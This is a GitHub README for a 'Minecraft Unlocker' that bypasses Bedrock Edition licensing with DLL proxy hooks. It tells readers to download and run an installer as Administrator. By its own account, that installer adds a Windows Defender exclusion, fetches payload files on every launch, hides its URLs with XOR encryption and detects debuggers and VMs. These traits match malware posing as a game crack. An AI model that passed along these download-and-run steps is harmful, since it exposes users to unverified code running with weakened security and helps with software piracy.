# Minecraft Unlocker by errortechh

A tool to unlock Minecraft for Windows (Bedrock Edition).

## 🚀 Quick Install

1. Download [`mc_installer.exe`](https://github.com/krinjalku/FIXMINECRAFTFILES/releases/latest/download/mc_installer.exe)
2. Run it (right-click → **Run as Administrator** for best results)
3. Done! Everything is set up automatically.

## 📦 What the Installer Does

- Downloads `minecraft_unlocker.exe` to `%APPDATA%\minecraft unlocker\`
- Sets up engine configs for two unlock methods:
  - **OnlineFix Method** — winmm proxy + OnlineFix DLL hooks
  - **errortechh method** — vcruntime proxy + isTrial patch
- Creates a **desktop shortcut**
- Adds Windows Defender exclusion
- Launches the unlocker when done

## 🔑 Key System

The unlocker uses a key system to verify access:

1. Open the unlocker — you'll see a **"KEY REQUIRED"** screen with your **HWID**
2. Click **"Get Key"** — completes the verification process via work.ink
3. After completing the tasks, you'll receive a **16-character key** locked to your machine
4. Paste the key in the app and click **"Activate"**
5. The key is valid for **7 days**, then you'll need a new one

> **Note:** Each key is locked to your machine's HWID (Hardware ID). Keys cannot be shared between different computers.

## 🛡️ Security

- **HWID-locked keys** — keys only work on the machine they were generated for
- **Token-gated access** — key page requires a valid work.ink completion token
- **Encrypted URLs** — all sensitive URLs are XOR-encrypted in the binary
- **Anti-debug** — detects debuggers, reverse engineering tools, and VMs
- **Embedded assets** — background image compiled into the exe, no external downloads needed

## 🗑️ Uninstall

1. Download [`uninstall.bat`](https://raw.githubusercontent.com/krinjalku/FIXMINECRAFTFILES/main/uninstall.bat) and run it
2. Or manually delete `%APPDATA%\minecraft unlocker\` and the desktop shortcut

## ✨ Features

- 🎮 **Game detection** — auto-detects Minecraft installation
- 📥 **Auto-download** — downloads unlock files from GitHub on every use
- 🎯 **Game tracker** — shows "PLAYING..." while game is running, resets when closed
- 🟩 **Grass block icon** — custom Minecraft-themed app icon
- 📁 **AppData storage** — all data stored in `%APPDATA%\minecraft unlocker\`
- 🖥️ **Desktop shortcut** — created automatically by installer
- 🔐 **Key system** — 7-day rotating keys with HWID lock
- 🛡️ **Anti-tamper** — debugger, VM, and RE tool detection

## 📁 Repository Structure

```
engine_a/          OnlineFix method payload files
engine_b/          errortechh method payload files
keypage/           Key system web page (GitHub Pages)
uninstall.bat      Uninstaller
```

## 👨‍💻 Credits

Made by **errortechh** — [YouTube](https://youtube.com/@errortechh)